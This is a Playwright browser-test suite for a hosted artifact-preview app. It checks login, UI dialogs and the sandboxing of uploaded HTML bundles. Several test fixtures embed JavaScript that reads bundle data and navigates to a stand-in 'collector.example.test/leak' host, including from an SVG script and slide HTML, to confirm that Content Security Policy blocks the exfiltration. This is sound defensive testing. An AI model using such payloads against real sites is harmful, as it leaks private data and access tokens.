"""Hosted opaque preview behavior in a real browser."""

import os
from pathlib import Path

import pytest
from playwright.sync_api import Browser, Route, expect

from artifact_studio.artifacts import ArtifactStore
from artifact_studio.models import SlidePatch
from artifact_studio.storage import digest
from tests.design_factory import TEMPLATE_ID, make_design
from tests.integration.hosted_fixture import WORKSPACE, routed_hosted_context, running_hosted_app

pytestmark = [
    pytest.mark.browser,
    pytest.mark.skipif(
        os.environ.get("ARTIFACT_STUDIO_BROWSER_TESTS") != "1", reason="Opt-in browser journeys"
    ),
]


def test_hosted_preview_loads_modules_and_assets_without_workspace_access(
    browser: Browser, tmp_path: Path, artifacts: Path
) -> None:
    bundle = tmp_path / "bundle"
    (bundle / "nested").mkdir(parents=True)
    (
        bundle / "index.html"
    ).write_text("""<!doctype html><link rel="stylesheet" href="nested/style.css">
        <div id="result">Waiting</div><img id="image" src="nested/image.svg">
        <script type="module" src="nested/main.js"></script>""")
    (bundle / "nested/style.css").write_text(
        '#result { color: rgb(1, 2, 3); background-image: url("image.svg"); }'
    )
    (bundle / "nested/image.svg").write_text(
        '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
        '<rect width="10" height="10" fill="red"/></svg>'
    )
    (bundle / "nested/main.js").write_text("""import {message} from './module.js';
        document.querySelector('#result').textContent = message;
        fetch('https://studio.example.test/api/hub').then(r => r.text()).then(
          () => document.body.dataset.workspaceRead = 'allowed',
          () => document.body.dataset.workspaceRead = 'blocked');""")
    (bundle / "nested/module.js").write_text("export const message = 'Module loaded';")
    with running_hosted_app(tmp_path / "hosted", artifacts / "server.log") as app:
        store = ArtifactStore(app.store)
        project = store.create_project("Fictional browser project")
        artifact = store.register_artifact(project.id, "Browser fixture", bundle, "index.html")
        with routed_hosted_context(browser, app) as context:
            page = context.new_page()
            page.goto(f"{WORKSPACE}/?artifact={artifact.id}")
            frame = page.frame_locator("#hub-html-preview")
            expect(frame.locator("#result")).to_have_text("Module loaded")
            expect(frame.locator("body")).to_have_attribute("data-workspace-read", "blocked")
            assert (
                frame.locator("#result").evaluate("e => getComputedStyle(e).color")
                == "rgb(1, 2, 3)"
            )
            assert frame.locator("#image").evaluate("e => e.complete && e.naturalWidth === 10")
            page.screenshot(path=str(artifacts / "hosted-browser.png"), full_page=True)


def test_hosted_authentication_and_browser_write(
    browser: Browser, tmp_path: Path, artifacts: Path
) -> None:
    with running_hosted_app(tmp_path / "hosted", artifacts / "server.log") as app:
        with routed_hosted_context(browser, app, authenticated=False) as context:
            page = context.new_page()
            response = page.goto(WORKSPACE)
            assert response is not None and response.status == 401
        with routed_hosted_context(browser, app) as context:
            page = context.new_page()
            response = page.goto(WORKSPACE)
            assert response is not None and response.status == 200
            result = page.evaluate("""async () => {
                const response = await fetch('/api/hub/projects', {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({title: 'Fictional browser write', context: ''})
                });
                return {status: response.status, body: await response.json()};
            }""")
            assert result["status"] == 200
            assert result["body"]["title"] == "Fictional browser write"


@pytest.mark.parametrize("width,height", [(1440, 900), (390, 844), (320, 700)])
def test_hosted_connection_is_discoverable_without_local_admin_requests(
    browser: Browser, tmp_path: Path, artifacts: Path, width: int, height: int
) -> None:
    with (
        running_hosted_app(tmp_path / "hosted", artifacts / "server.log") as app,
        routed_hosted_context(browser, app) as context,
    ):
        page = context.new_page()
        page.set_viewport_size({"width": width, "height": height})
        failures: list[str] = []
        page.on(
            "response",
            lambda response: failures.append(response.url) if response.status >= 400 else None,
        )
        page.goto(WORKSPACE)
        hosted = page.locator("[data-hosted-status]")
        expect(hosted).to_be_visible()
        expect(hosted).to_have_text("Hosted")
        expect(page.locator("[data-session-mode]")).to_be_hidden()
        expect(page.get_by_role("button", name="Hosted", exact=True)).to_have_count(0)
        assert page.evaluate("document.documentElement.scrollWidth <= innerWidth")
        page.locator("#hub-tools-button").click()
        page.locator("[data-hub-connect]").click()
        dialog = page.get_by_role("dialog", name="Agent connection")
        expect(dialog).to_be_visible()
        expect(dialog.locator("input")).to_have_value(WORKSPACE + "/mcp")
        expect(dialog).to_contain_text("CF-Access-Client-Id")
        assert dialog.evaluate("e => e.scrollWidth <= e.clientWidth")
        page.keyboard.press("Escape")
        expect(page.locator("#hub-tools-button")).to_be_focused()
        page.locator("#hub-tools-button").click()
        page.get_by_role("menuitem", name="Workspace & server").click()
        about = page.get_by_role("dialog", name="Workspace & server")
        expect(about).to_contain_text("reviewer@example.test")
        expect(about.get_by_text("Server checks", exact=False).first).to_be_visible()
        page.keyboard.press("Escape")
        expect(page.locator("#hub-tools-button")).to_be_focused()
        assert not failures


def test_expiry_clears_open_connection_and_preserves_review_page(
    browser: Browser,
    tmp_path: Path,
    artifacts: Path,
) -> None:
    with (
        running_hosted_app(tmp_path / "hosted", artifacts / "server.log") as app,
        routed_hosted_context(browser, app) as context,
    ):
        context.grant_permissions(["clipboard-read", "clipboard-write"], origin=WORKSPACE)
        page = context.new_page()
        page.goto(WORKSPACE)
        expect(page.locator("[data-hosted-status]")).to_be_visible()
        page.locator("#hub-tools-button").click()
        page.locator("[data-hub-connect]").click()
        dialog = page.get_by_role("dialog", name="Agent connection")
        expect(dialog.locator("input")).to_have_value(WORKSPACE + "/mcp")
        dialog.locator("[data-copy-mcp]").click()
        expect(dialog.locator("[data-copy-status]")).to_have_text("URL copied.")
        page.route(
            "**/api/app-info",
            lambda route: route.fulfill(
                status=401,
                json={"detail": "Authentication required"},
            ),
        )
        page.evaluate(
            "fetch('/api/app-info').then(response => window.ArtifactSession.observe(response))"
        )
        expect(dialog.locator("input")).to_have_value("")
        expect(dialog.locator("[data-copy-status]")).to_be_empty()
        expect(dialog.locator("[data-copy-mcp]")).to_be_disabled()
        expect(dialog.locator("[data-hub-cloudflare]")).to_be_hidden()
        expect(dialog.locator("[data-hub-setup]").last).to_be_hidden()
        expect(dialog.get_by_role("button", name="Sign in again")).to_be_visible()
        expect(page.locator(".app-session-expired")).to_be_hidden()
        assert page.url == WORKSPACE + "/"
        page.keyboard.press("Escape")
        expect(page.locator(".app-session-expired")).to_be_visible()
        page.locator("#hub-tools-button").click()
        page.locator("[data-hub-connect]").click()
        expect(dialog.locator("[data-copy-mcp]")).to_be_disabled()
        expect(dialog.locator("[data-hub-setup]").last).to_be_hidden()
        expect(dialog.get_by_role("button", name="Sign in again")).to_be_visible()


@pytest.mark.parametrize("shell", ["/", "/web/hub.html"])
def test_hosted_bundle_navigation_stays_offline(
    browser: Browser, tmp_path: Path, artifacts: Path, shell: str
) -> None:
    """Allow relative pages while blocking data/capability exfiltration from every shell."""
    bundle = tmp_path / "bundle"
    (bundle / "nested").mkdir(parents=True)
    (bundle / "index.html").write_text('<a href="nested/page.html">Open nested page</a>')
    (bundle / "nested/data.txt").write_text("FICTIONAL_PRIVATE_BUNDLE_DATA")
    (bundle / "nested/page.html").write_text("""<!doctype html>
        <h1>Nested page</h1><a href="../index.html">Back to start</a>
        <button id="leak" disabled>Attempt external navigation</button><script>
        fetch('data.txt').then(r=>r.text()).then(data=>{
          document.querySelector('#leak').disabled=false;
          document.querySelector('#leak').onclick=()=>location.replace(
            'https://collector.example.test/leak?data='+encodeURIComponent(data)+
            '&cap='+encodeURIComponent(location.href));
        });</script>""")
    with running_hosted_app(tmp_path / "hosted", artifacts / "server.log") as app:
        registry = ArtifactStore(app.store)
        project = registry.create_project("Fictional navigation fixture")
        artifact = registry.register_artifact(
            project.id, "Navigation fixture", bundle, "index.html"
        )
        with routed_hosted_context(browser, app) as context:
            collected: list[str] = []

            def collect(route: Route) -> None:
                collected.append(route.request.url)
                route.fulfill(status=200, body="Fictional collector")

            context.route("https://collector.example.test/**", collect)
            page = context.new_page()
            page.goto(f"{WORKSPACE}{shell}?artifact={artifact.id}")
            frame = page.frame_locator("#hub-html-preview")
            frame.get_by_role("link", name="Open nested page").click()
            expect(frame.get_by_role("heading")).to_have_text("Nested page")
            # Raw pages remain unbridged: selectors cannot be attributed to the entrypoint.
            assert frame.locator("script[data-artifact-root]").count() == 0
            frame.get_by_role("link", name="Back to start").click()
            frame.get_by_role("link", name="Open nested page").click()
            expect(frame.locator("#leak")).to_be_enabled()
            with page.expect_console_message(
                predicate=lambda message: (
                    "collector.example.test" in message.text
                    and "Content Security Policy" in message.text
                )
            ):
                frame.locator("#leak").click()
            assert collected == []
            warning = page.locator("#hub-preview-warning")
            expect(warning).to_contain_text("Preview navigation was blocked")
            warning.get_by_role("button", name="Reload preview").click()
            expect(warning).to_be_hidden()
            expect(frame.get_by_role("link", name="Open nested page")).to_be_visible()


def test_hosted_preview_bridge_uses_workspace_parent(
    browser: Browser, tmp_path: Path, artifacts: Path
) -> None:
    """Select authored content through the real UI after scripts move to the preview host."""
    bundle = tmp_path / "bundle"
    bundle.mkdir()
    (bundle / "index.html").write_text('<h1 id="heading">Fictional selection target</h1>')
    with running_hosted_app(tmp_path / "hosted", artifacts / "server.log") as app:
        registry = ArtifactStore(app.store)
        project = registry.create_project("Fictional selection fixture")
        artifact = registry.register_artifact(project.id, "Selection fixture", bundle, "index.html")
        with routed_hosted_context(browser, app) as context:
            page = context.new_page()
            page.goto(f"{WORKSPACE}/?artifact={artifact.id}")
            frame = page.frame_locator("#hub-html-preview")
            expect(frame.locator("#heading")).to_be_visible()
            page.locator('[data-action="select"]').click()
            frame.locator("#heading").click()
            expect(page.locator("#hub-targets")).to_contain_text("Fictional selection target")


@pytest.mark.parametrize("filename", ["page.html", "active.svg"])
def test_hosted_capability_documents_download_without_parent(
    browser: Browser, tmp_path: Path, artifacts: Path, filename: str
) -> None:
    """A signed resource opened as a tab must not execute outside the parent frame policy."""
    bundle = tmp_path / "bundle"
    bundle.mkdir()
    (bundle / "index.html").write_text("<h1>Fictional download fixture</h1>")
    payload = "location.replace('https://collector.example.test/leak')"
    (bundle / "page.html").write_text(f"<script>{payload}</script>")
    (bundle / "active.svg").write_text(
        f'<svg xmlns="http://www.w3.org/2000/svg"><script>{payload}</script></svg>'
    )
    with running_hosted_app(tmp_path / "hosted", artifacts / "server.log") as app:
        registry = ArtifactStore(app.store)
        project = registry.create_project("Fictional capability fixture")
        artifact = registry.register_artifact(project.id, "Download fixture", bundle, "index.html")
        with routed_hosted_context(browser, app) as context:
            collected: list[str] = []

            def collect(route: Route) -> None:
                collected.append(route.request.url)
                route.fulfill(status=200, body="Fictional collector")

            context.route("https://collector.example.test/**", collect)
            page = context.new_page()
            page.goto(f"{WORKSPACE}/?artifact={artifact.id}")
            frame = page.frame_locator("#hub-html-preview")
            expect(frame.get_by_role("heading")).to_be_visible()
            resource = frame.locator("head").evaluate("e=>e.ownerDocument.baseURI") + filename
            page.evaluate(
                """url=>{
                const link=document.createElement('a');link.id='direct-capability';
                link.href=url;link.textContent='Open resource directly';document.body.append(link);
            }""",
                resource,
            )
            with page.expect_download() as download:
                page.locator("#direct-capability").click()
            assert download.value.suggested_filename == filename
            assert page.url.startswith(WORKSPACE)
            assert collected == []


@pytest.mark.parametrize("endpoint", ["audience", "exports/pdf"])
def test_hosted_audience_keeps_authored_scripts_behind_offline_parent(
    browser: Browser, tmp_path: Path, artifacts: Path, endpoint: str
) -> None:
    """Top-level export viewers retain the runtime's independent nested sandbox."""
    with running_hosted_app(tmp_path / "hosted", artifacts / "server.log") as app:
        make_design(app.store.root / TEMPLATE_ID)
        deck = app.store.create("2026-11-08-hosted-audience", "Fictional audience", "test-brand")
        slide = deck.slides[0]
        app.store.revise(
            deck.id,
            slide.id,
            digest(slide.model_dump_json()),
            "hosted-offline-slide",
            SlidePatch(
                interactive_html="""<button id="attempt" style="margin: 150px">
            Attempt navigation</button>
            <script>document.querySelector('#attempt').onclick=()=>location.replace(
              'https://collector.example.test/leak?data=FICTIONAL_AUDIENCE_CONTENT');</script>"""
            ),
        )
        with routed_hosted_context(browser, app) as context:
            collected: list[str] = []

            def collect(route: Route) -> None:
                collected.append(route.request.url)
                route.fulfill(status=200, body="Fictional collector")

            context.route("https://collector.example.test/**", collect)
            page = context.new_page()
            page.goto(f"{WORKSPACE}/api/decks/{deck.id}/{endpoint}")
            selector = (
                "#stage .runtime-slide-canvas > iframe"
                if endpoint == "audience"
                else ".print-page iframe"
            )
            frame = page.frame_locator(selector).first.frame_locator("iframe")
            expect(frame.locator("#attempt")).to_be_visible()
            with page.expect_console_message(
                predicate=lambda message: (
                    "collector.example.test" in message.text
                    and "Content Security Policy" in message.text
                )
            ):
                frame.locator("#attempt").click()
            assert collected == []
